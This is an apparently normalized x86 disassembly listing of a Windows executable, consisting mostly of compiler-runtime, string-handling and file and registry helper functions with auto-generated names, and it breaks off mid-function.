jmp r-xdata
jmp sub_401fb2
sub_401fb2
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
retn 0x4
j_sub_402403
jmp sub_402403
sub_40230a
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_401089
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_402636
pop esi
retn 0x4
sub_402388
push esi
mov esi ecx
call sub_4026cc
mov eax esi
pop esi
retn 0x4
sub_402396
mov eax [ esp + 0x4 ]
retn 0x4
sub_40246e
push 0xffffffff
push 0x0
push [ esp + 0xc ]
call sub_40247e
retn 0x4
sub_402504
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
call sub_401014
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_4027e1
pop esi
retn 0x4
sub_402537
push esi
push ecx
mov esi ecx
call sub_402624
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx * 2 ]
mov ecx [ esp + 0xc ]
push eax
call sub_40297c
mov eax [ esp + 0x8 ]
pop esi
retn 0x4
sub_4026bc
push r--data
call sub_40eb67
j_sub_402aa9
jmp sub_402aa9
sub_4026cc
and [ ecx + 0x10 ] 0x0
and [ ecx + 0x14 ] 0x0
mov eax ecx
retn
sub_402842
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
cmp [ esi + 0x10 ] eax
jb r-xdata
call sub_4026bc
push eax
call sub_4028eb
mov eax esi
pop esi
retn 0x4
sub_402971
push r--data
call sub_40eb39
sub_40297c
push esi
push ecx
push [ esp + 0xc ]
mov esi ecx
call sub_402bdd
mov eax esi
pop esi
retn 0x8
sub_402aa9
push [ esp + 0x4 ]
call j_sub_40f402#2
pop ecx
retn 0x8
sub_402ab6
call j_sub_402de1
xor edx edx
inc edx
lea ecx [ eax - 0x1 ]
cmp eax edx
cmovbe ecx edx
mov eax ecx
retn
sub_402b2b
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call j_sub_402db7
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_402b95
mov ecx [ ebp - 0x18 ]
push 0x0
push 0x1
call sub_4025d7
push 0x0
push 0x0
call sub_4112eb
int3
sub_402bdd
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_402be8
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
cmp [ esi + 0x10 ] eax
jb r-xdata
call sub_4026bc
push eax
call sub_402695
mov eax esi
pop esi
retn 0x4
sub_402d71
mov ecx [ ebp - 0x1c ]
push 0x0
push 0x1
call sub_402327
push 0x0
push 0x0
call sub_4112eb
int3
j_sub_402db7
jmp sub_402db7
j_sub_402de1
jmp j_sub_402de1#2
j_sub_402dc8
jmp sub_402dc8
sub_402d96
push ecx
call sub_402dd8
pop ecx
retn
sub_402db7
mov ecx [ esp + 0x4 ]
call sub_402f07
retn 0x4
j_sub_402de1#2
jmp sub_402de1
sub_402dc8
push 0x0
push [ esp + 0x8 ]
call sub_402f29
pop ecx
pop ecx
retn 0x4
sub_402dd8
mov ecx [ esp + 0x4 ]
jmp sub_402df4
sub_402de1
mov eax 0x7fffffff
retn
sub_402de7
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
sar eax 0x1
retn 0x4
sub_402df4
or eax 0xffffffff
retn
sub_402df8
push ecx
call sub_403028
neg eax
sbb eax eax
inc eax
retn
sub_402e89
call j_sub_4035cd
xor ecx ecx
test al al
sete cl
mov al cl
retn
sub_402ecd
push esi
push [ esp + 0xc ]
mov esi ecx
call sub_402eeb
push eax
push [ esp + 0x10 ]
push esi
call sub_4035b4
add esp 0x10
pop esi
retn 0x8
sub_402eeb
mov eax [ esp + 0x4 ]
retn
sub_402ef0
mov ecx [ esp + 0x8 ]
call sub_402385
mov edx [ esp + 0x4 ]
push eax
call sub_4035d0
pop ecx
retn 0x8
sub_402f4d
push esi
push [ esp + 0xc ]
mov esi ecx
call sub_401089
pop ecx
push eax
push [ esp + 0x10 ]
push ecx
mov ecx esi
call sub_40304a
pop esi
retn 0x8
j_sub_40111a
jmp sub_40111a
sub_40325b
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_402de7
leave
retn 0x4
sub_403273
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
j_sub_4035cd
jmp sub_4035cd
sub_4035b4
push [ esp + 0xc ]
call sub_402eeb
pop ecx
mov ecx [ esp + 0x4 ]
push eax
push [ esp + 0xc ]
call sub_4035e5
retn
sub_4035cd
mov al 0x1
retn
sub_4035d0
mov ecx [ esp + 0x4 ]
push esi
mov esi edx
call sub_402385
push eax
push esi
call sub_40360b
pop esi
retn
sub_403658
mov eax [ esp + 0x4 ]
add eax eax
push eax
push edx
push ecx
call sub_40ebc0
add esp 0xc
retn
sub_40366a
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
cmp [ ecx ] dx
je r-xdata
mov eax ecx
retn
add ecx 0x2
dec eax
jne r-xdata
sub_403683
mov eax [ esp + 0x4 ]
add eax eax
push eax
push edx
push ecx
call sub_410c10
add esp 0xc
retn
sub_4036e1
and [ ecx ] 0x0
and [ ecx + 0x4 ] 0x0
retn
j_sub_4037ba
jmp sub_4037ba
sub_403bf3
test ecx ecx
je r-xdata
xor eax eax
inc eax
retn
cmp ecx 0x21
je r-xdata
cmp ecx 0x30101
je r-xdata
xor eax eax
retn
sub_4041b1
push 0x0
call sub_404169
pop ecx
retn
sub_4041ba
push 0x1
call sub_404169
pop ecx
retn
sub_40436e
mov ecx [ esp + 0x4 ]
push [ esp + 0xc ]
mov edx [ esp + 0xc ]
lea ecx [ ecx + 0x8 ]
call sub_4041e5
neg eax
sbb eax eax
pop ecx
and eax 0x8
retn
sub_40438b
mov ecx [ esp + 0x4 ]
push [ esp + 0xc ]
mov edx [ esp + 0xc ]
lea ecx [ ecx + 0x8 ]
call sub_4042e1
pop ecx
retn
sub_4043a1
mov [ ecx ] sub_40436e
mov [ ecx + 0x4 ] sub_40438b
retn
sub_4043af
add ecx 0x10
jmp sub_4036e1
sub_4043b7
push esi
mov esi ecx
lea ecx [ esi + 0x10 ]
call sub_403718
mov ecx esi
pop esi
jmp sub_4043af
sub_4043ca
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x24 ] eax
retn
sub_4044c7
xor eax eax
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x1c ] al
retn
sub_4044d4
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x1c ] eax
retn
sub_404549
call sub_4044d4
xor eax eax
mov [ ecx + 0x30 ] eax
mov [ ecx + 0x34 ] eax
mov [ ecx + 0x38 ] eax
mov [ ecx + 0x3c ] eax
mov [ ecx + 0x40 ] eax
add ecx 0x44
jmp sub_4036e1
sub_404718
mov eax [ ecx + 0x30 ]
push esi
mov edx [ eax + edx * 4 ]
mov esi [ ecx + 0x34 ]
mov eax [ esi + edx * 8 ]
add eax [ ecx + 0x28 ]
mov edx [ esi + edx * 8 + 0x4 ]
adc edx [ ecx + 0x2c ]
pop esi
retn
sub_4067dc
push r--data
push 0x30e
push ecx
call sub_40f4cc
add esp 0xc
retn
sub_406878
push 0x6
push [ esp + 0x8 ]
call sub_406825
pop ecx
pop ecx
retn
sub_4068d8
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
add [ ecx + 0x14 ] eax
xor eax eax
retn
sub_406930
mov eax [ esp + 0x4 ]
push [ esp + 0xc ]
and [ eax + 0x18 ] 0x0
and [ eax + 0x14 ] 0x0
mov eax [ eax + 0x10 ]
push [ esp + 0xc ]
push eax
call [ eax + 0x4 ]
add esp 0xc
retn
sub_40694f
mov [ ecx ] sub_406886
mov [ ecx + 0x4 ] sub_4068d8
mov [ ecx + 0x8 ] sub_4068e6
mov [ ecx + 0xc ] sub_406930
retn
sub_40696b
and [ ecx + 0x18 ] 0x0
and [ ecx + 0x14 ] 0x0
retn
sub_406fda
and [ ecx + 0x78 ] 0x0
xor eax eax
inc eax
mov [ ecx + 0x80 ] eax
mov [ ecx + 0x84 ] eax
mov [ ecx + 0x88 ] eax
jmp sub_4086eb
sub_4086eb
and [ ecx + 0x24 ] 0x0
xor edx edx
inc edx
push edx
call sub_4086c4
pop ecx
retn
sub_40898f
push esi
mov esi ecx
push [ esi + 0x10 ]
push edx
call [ edx + 0x4 ]
and [ esi + 0x10 ] 0x0
pop ecx
pop ecx
pop esi
retn
j_sub_402504
jmp sub_402504
sub_408a8a
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push [ esp + 0x4 ]
push edx
push ecx
call sub_41bb5b
add esp 0xc
retn
xor eax eax
retn
sub_408aa3
movsx eax [ esp + 0x4 ]
push edx
push eax
push ecx
call sub_414c70
add esp 0xc
retn
sub_408eff
call j_sub_402624
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
setne al
retn
sub_409449
push ecx
sub esp 0x18
mov ecx esp
push r--data
call sub_402193
xor cl cl
call sub_4094b1
add esp 0x1c
retn
j_sub_40230a
jmp sub_40230a
sub_40981f
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_401089
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_409894
pop esi
retn 0x4
sub_40983c
call sub_40239d
add eax [ esp + 0x4 ]
retn 0x4
j_sub_40239d
jmp j_sub_40239d#2
sub_409852
push ecx
push [ esp + 0x8 ]
call sub_409948
retn 0x4
j_sub_402624#2
jmp j_sub_402624
sub_409864
push ecx
push [ esp + 0x8 ]
call sub_409966
retn 0x4
sub_40992a
push esi
push ecx
mov esi ecx
call sub_40239d
add eax [ esi + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
call sub_40297c
mov eax [ esp + 0x8 ]
pop esi
retn 0x4
sub_409948
mov eax [ esp + 0x4 ]
cmp eax [ ecx + 0x10 ]
ja r-xdata
sub eax [ ecx + 0x10 ]
push ecx
push eax
call sub_409a0e
push eax
call sub_402695
jmp r-xdata
retn 0x8
sub_409966
mov eax [ esp + 0x4 ]
cmp eax [ ecx + 0x10 ]
ja r-xdata
sub eax [ ecx + 0x10 ]
push 0x0
push eax
call sub_40241f
push eax
call sub_4028eb
jmp r-xdata
retn 0x8
sub_409ab3
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
retn 0x4
sub_409bb9
push edx
call sub_409cd4
neg eax
sbb eax eax
inc eax
retn
j_sub_409cfa
jmp sub_409cfa
j_sub_40981f
jmp sub_40981f
sub_409cc1
push ecx
push ecx
push [ esp + 0x10 ]
push ecx
call sub_409e25
retn 0x8
sub_409cd0
mov eax [ ecx + 0x14 ]
retn
sub_409cfa
push 0xffffffff
push 0x0
push [ esp + 0xc ]
call sub_409985
retn 0x4
sub_409ed3
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_409ab3
leave
retn 0x4
sub_40a11b
mov al [ edx ]
push ebx
mov bl [ ecx ]
mov [ ecx ] al
mov [ edx ] bl
pop ebx
retn
sub_40a3ae
test edx edx
jne r-xdata
mov eax [ esp + 0x4 ]
push edx
movsx eax [ eax ]
push eax
push ecx
call sub_40fec0
add esp 0xc
retn
xor eax eax
retn
sub_40a41b
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0xc0000000
push ecx
call [ CreateFileW@IAT ]
retn
sub_40a80a
push ecx
push ecx
push ecx
call sub_40a73f
add esp 0xc
retn
sub_40acea
push 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_409eeb
retn 0xc
sub_40ae55
push esi
mov esi ecx
call sub_40ae71
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
sub_40b1e2
mov ecx [ ebp - 0x64 ]
call sub_40b22a
and [ ebp - 0x64 ] 0x0
lea ecx [ ebp + 0x4 ]
call sub_41029e
mov eax r-xdata
retn
sub_40b224
and [ ecx ] 0x0
retn 0x4
sub_40b417
and [ ebp + 0x14 ] 0x0
lea ecx [ ebp + 0x4 ]
call sub_41029e
mov eax r-xdata
retn
sub_40b498
mov eax [ ecx + 0x48 ]
retn
sub_40b49c
mov cx [ ecx ]
xor eax eax
cmp cx [ edx ]
sete al
retn
j_sub_40e891
jmp sub_40e891
sub_40b536
and [ ecx ] 0x0
and [ ecx + 0x4 ] 0x0
retn 0x4
sub_40b8e2
lea ecx [ ebp - 0x88c ]
mov [ ebp - 0x8e5 ] 0x0
call sub_40dd52
mov eax r-xdata
retn
sub_40beb0
push 0x0
mov edx r--data
mov ecx 0x80000000
call sub_40b4ad
pop ecx
retn
j_sub_40b224
jmp sub_40b224
sub_40dd52
push 0x0
call sub_402695
retn
sub_40dd5a
push 0x0
call sub_4028eb
retn
sub_40dd62
push 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_403359
retn 0xc
sub_40dd7a
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
call sub_401014
push eax
push [ esp + 0x14 ]
mov ecx esi
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_4030e4
pop esi
retn 0xc
sub_40dd9e
push esi
mov esi [ esp + 0x8 ]
cmp [ ecx + 0x10 ] esi
jbe r-xdata
call sub_4026bc
call sub_402624
lea eax [ eax + esi * 2 ]
pop esi
retn 0x4
sub_40ddba
mov eax [ ecx + 0x10 ]
dec eax
push eax
call sub_402842
retn
sub_40ddc5
push ebp
mov ebp esp
push ecx
push ecx
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x2c
call sub_40df94
leave
retn 0x8
sub_40dddf
push ebp
mov ebp esp
push ecx
push ecx
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x5c
call sub_40df94
leave
retn 0x8
sub_40de18
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x14 ]
cmp [ ecx + 0x10 ] eax
cmovb eax [ ecx + 0x10 ]
push eax
call sub_402624
push eax
push [ esp + 0x10 ]
push ecx
mov ecx rw-data
call sub_403212
retn 0x14
sub_40de61
push esi
push ecx
mov esi ecx
call sub_40e07d
mov eax esi
pop esi
retn
j_sub_40e057
jmp sub_40e057
sub_40def1
push ecx
push [ ecx ]
mov ecx [ esp + 0xc ]
call sub_40297c
mov eax [ esp + 0x4 ]
retn 0x4
sub_40df04
push ecx
push [ ecx + 0x4 ]
mov ecx [ esp + 0xc ]
call sub_40297c
mov eax [ esp + 0x4 ]
retn 0x4
sub_40df18
call j_sub_40111a
mov ecx eax
jmp j_sub_402385
sub_40df24
push esi
mov esi ecx
call sub_40e08b
mov eax esi
pop esi
retn
sub_40df52
push [ esp + 0x4 ]
call sub_403273
xor ecx ecx
test al al
sete cl
mov al cl
retn 0x4
sub_40dffa
mov eax [ esp + 0x4 ]
cmp eax [ ecx + 0x4 ]
jae r-xdata
xor eax eax
cmp [ ecx ] eax
ja r-xdata
xor eax eax
inc eax
jmp r-xdata
retn 0x4
sub_40e07d
push esi
mov esi ecx
call sub_40e155
mov eax esi
pop esi
retn 0x4
sub_40e08b
add [ ecx ] 0x18
mov eax ecx
retn
j_sub_402385
jmp sub_402385
sub_40e096
mov eax [ ecx + 0x8 ]
sub eax [ ecx + 0x4 ]
push 0x18
cdq
pop ecx
idiv ecx
retn
sub_40e0a3
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
push 0x18
cdq
pop ecx
idiv ecx
retn
j_sub_40e189
jmp j_sub_40e189#3
sub_40e0b4
mov edx [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x8 ]
call sub_40e28a
pop ecx
retn 0x8
sub_40e14a
push r--data
call sub_40eb39
sub_40e155
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov eax ecx
retn
sub_40e162
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
push 0x18
cdq
pop ecx
idiv ecx
retn
j_sub_40e178
jmp sub_40e178
j_sub_40e189#3
jmp j_sub_40e189#2
sub_40e178
mov ecx [ esp + 0x4 ]
call sub_40e2bc
retn 0x4
j_sub_40e189#2
jmp sub_40e189
sub_40e189
mov eax 0xaaaaaaa
retn
sub_40e273
mov ecx [ esp + 0x8 ]
call sub_402385
mov edx [ esp + 0x4 ]
push eax
call sub_40e2de
pop ecx
retn 0x8
sub_40e2a5
mov edx [ esp + 0x8 ]
push ecx
push [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
call sub_40e312
pop ecx
pop ecx
retn 0xc
sub_40e2de
mov ecx [ esp + 0x4 ]
push esi
mov esi edx
call sub_402385
push eax
push esi
call sub_40e333
pop esi
retn
sub_40e2f3
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_40e35c
mov edx [ esp + 0x4 ]
call sub_40e38c
retn 0x4
sub_40e38c
push edx
call sub_40e393
retn
sub_40e393
mov ecx [ esp + 0x4 ]
jmp sub_40e39c
sub_40e39c
push esi
mov esi ecx
call sub_40223f
mov eax esi
pop esi
retn 0x4
sub_40e592
push ebp
mov ebp esp
push ecx
push ecx
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x20
call sub_40e5c6
leave
retn 0x8
sub_40e5ac
push ebp
mov ebp esp
push ecx
push ecx
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x20
call sub_40e616
leave
retn 0x8
sub_40e6b6
lea ecx [ esp + 0x4 ]
jmp sub_40111a
sub_40e705
push esi
mov esi ecx
call sub_40e711
mov eax esi
pop esi
retn
sub_40e711
add [ ecx ] 0x2
mov eax ecx
retn
j_sub_40e807
jmp sub_40e807
sub_40e885
and [ ecx ] 0x0
and [ ecx + 0x4 ] 0x0
mov eax ecx
retn 0xc
sub_40e891
push esi
mov esi ecx
call sub_40e9d6
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ RegCloseKey@IAT ]
and [ esi ] 0x0
sub_40e9b9
cmp [ ecx ] 0x0
jne r-xdata
push [ esp + 0x4 ]
push [ ecx ]
call [ SHDeleteKeyW@IAT ]
neg eax
sbb eax eax
inc eax
xor al al
jmp r-xdata
retn 0x4
sub_40ea48
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41027b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40ea63
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41027b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40ea7e
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41027b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40ea99
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41027b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40eab4
mov [ ecx ] r--data
jmp sub_41029e
j_sub_41029e
jmp sub_41029e
sub_40eb95
push ebp
mov ebp esp
pop ebp
jmp sub_40f24f
j_sub_40f402#2
jmp sub_40f402
sub_40f204
push ecx
mov [ ecx ] r--data
call sub_4119fc
pop ecx
retn
sub_40f307
call sub_41091f
retn
sub_40f3c3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40f2cd
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40f3d8
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_411e02
push 0x1
push 0x0
call sub_411fbd
add esp 0xc
jmp sub_411fdc
call eax
j_sub_40f402
jmp j_sub_40f402#2
sub_40f63a
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4124a5
add esp 0x14
pop ebp
retn
sub_40f656
push ebp
mov ebp esp
pop ebp
jmp sub_40f65f
sub_40f65f
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4133ef
add esp 0xc
pop ebp
retn
sub_40f673
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f688
add esp 0xc
pop ebp
retn
sub_40f74a
push esi
call sub_413516
pop ecx
retn
sub_40f82d
push esi
call sub_413516
pop ecx
retn
sub_40f9f8
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40fa13
add esp 0x14
pop ebp
retn
sub_40fa9c
push esi
call sub_413516
pop ecx
retn
sub_40fc71
push esi
call sub_413516
pop ecx
retn
sub_40fd35
push esi
call sub_413516
pop ecx
retn
sub_40fd3d
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc79
add esp 0xc
pop ebp
retn
sub_40feaf
push esi
call sub_413516
pop ecx
retn
sub_410161
push ebp
mov ebp esp
push 0x8
call sub_41016d
pop ebp
retn
sub_410260
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] 0x0
mov eax ecx
pop ebp
retn 0x8
sub_41029e
mov [ ecx ] r--data
jmp sub_41033f
sub_41033f
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_40f402
pop ecx
sub_41035b
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_4107ab
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_410779
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_4107dd
push 0x1
push 0x1
push 0x0
call sub_410928
add esp 0xc
retn
sub_4107ec
push 0x1
push 0x0
push 0x0
call sub_410928
add esp 0xc
retn
sub_41088c
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_410928
add esp 0xc
pop ebp
retn
sub_410916
push 0x8
call sub_416df0
pop ecx
retn
sub_41091f
push 0x8
call sub_416f54
pop ecx
retn
sub_410a42
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_416f54
pop ecx
sub_410a57
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_410928
add esp 0xc
pop ebp
retn
sub_410b9c
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_41745b
pop ecx
pop ecx
retn
sub_410bb0
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_4107dd
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_411bf5
retn
push esi
call sub_41088c
sub_410bd9
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_411e02
push 0xff
call sub_4107ab
call sub_411da5
_start
call sub_41791e
jmp sub_410a89
sub_411346
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_41135a
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40eb9e
jmp sub_411346
sub_411369
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40eb9e
jmp sub_411346
sub_411a64
push 0xe
call sub_416f54
pop ecx
retn
sub_411a93
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_411bf5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_411fbd
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not edx
and edx eax
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_41201f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4120b4
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_4121ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4133ef
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413213
add esp 0x10
pop ebp
retn
sub_41347a
call sub_413b60
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_40f402
and [ rw-data ] 0x0
pop ecx
retn
call sub_419ee4
sub_41368c
push 0x1
call sub_416f54
pop ecx
retn
sub_413a16
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_413940
add esp 0xc
pop ebp
retn 0x4
sub_413a49
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_41ab45
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_413a7b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_413940
add esp 0xc
pop ebp
retn 0x8
sub_413b60
push 0x1
call sub_413b69
pop ecx
retn
sub_413c11
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_413550
pop ecx
pop ecx
retn
sub_413c44
push 0x1
call sub_416f54
pop ecx
retn
sub_413d1f
push edi
call sub_41af07
pop ecx
retn
sub_413eca
push esi
call sub_41af07
pop ecx
retn
sub_414927
push 0xb
call sub_416f54
pop ecx
retn
sub_4149d1
push esi
call sub_41af07
pop ecx
retn
sub_414db9
push esi
call sub_41af07
pop ecx
retn
sub_415884
and [ rw-data ] 0x0
retn
sub_41588c
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_4158aa
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_4158c9
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_415ba8
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ SetUnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_415bb6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_415bcb
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_415f2e
push 0xc
call sub_416f54
pop ecx
retn
sub_415f82
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4162e2
pop ecx
mov [ rw-data ] 0x1
sub_4162d9
push 0xd
call sub_416f54
pop ecx
retn
sub_41645a
push 0xd
call sub_416f54
pop ecx
retn
sub_416859
push 0xd
call sub_416f54
pop ecx
retn
sub_416865
push 0xc
call sub_416f54
pop ecx
retn
sub_416996
push 0xd
call sub_416f54
pop ecx
retn
sub_41699f
push 0xc
call sub_416f54
pop ecx
retn
sub_416a1e
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_416e24
push eax
call sub_4158aa
or [ rw-data ] 0xffffffff
pop ecx
sub_416a84
push 0xc
call sub_416f54
pop ecx
retn
sub_416b72
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_416b3c
pop ecx
pop ecx
pop ebp
retn
sub_416f16
push 0xa
call sub_416f54
pop ecx
retn
sub_416f54
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417049
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_4170b1
push esi
xor esi esi
